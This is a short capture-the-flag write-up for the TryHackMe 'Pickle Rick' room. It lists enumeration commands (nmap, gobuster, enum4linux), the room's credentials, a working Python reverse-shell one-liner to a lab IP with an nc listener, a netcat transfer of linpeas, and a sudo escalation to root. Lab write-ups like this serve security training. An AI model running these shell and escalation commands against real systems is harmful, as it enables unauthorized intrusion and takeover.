# IP
https://tryhackme.com/room/picklerick
```
export IP=
```

# NMAP
```
mkdir nmap
nmap -sC -sV -oN nmap/initial $IP
```
* `-sC` - Use default script
* `-sV` - Probe open ports to determine service/version info
* `-oN` - Output scan in normal mode

# View Page Source
```
Username: R1ckRul3s
```
# Gobuster
```
gobuster dir -u "http://$IP" -w /opt/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
```
# enum4linux
Trying to find username and password
```
/opt/enum4linx/enum4linx.pl -a $IP | tee enum4linux.log
```
Found a `robots.txt` page. In that page there was a:
```
Wubbalubbadubdub
```

There is a `login.php` page. We can login using the following credentials:
```
R1ckRul3s
Wubbalubbadubdub
```

From here we have a command prompt. Was able to find the first password using:
```
grep "" *.txt
```

```
python3 -c 'import socket,subprocess,os;ip="10.2.44.85";port=9999;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
nc -lnvp 9999
```

target terminal:
```
python3 -c 'import pty; pty.spawn("/bin/bash")' && 
stty raw -echo
export TERM=xterm
```


# Linpeas
target terminal:
```
nc -l -p 1234 > /tmp/jake &
```

my terminal:
```
nc $IP $PORT < linpeas.sh
```

Finally, run:
```
chmod +x /tmp/jake
/tmp/jake
```

```
User www-data may run the following commands on ip-10-10-13-18.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL

[+] Checking sudo tokens
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)
gdb wasn't found in PATH

[+] Checking /etc/doas.conf
/etc/doas.conf Not Found

[+] Checking Pkexec policy
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!

[+] Superusers
root:x:0:0:root:/root:/bin/bash

[+] Users with console
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```

So we can run:
```
sudo bash
```

To login as root and get final flag
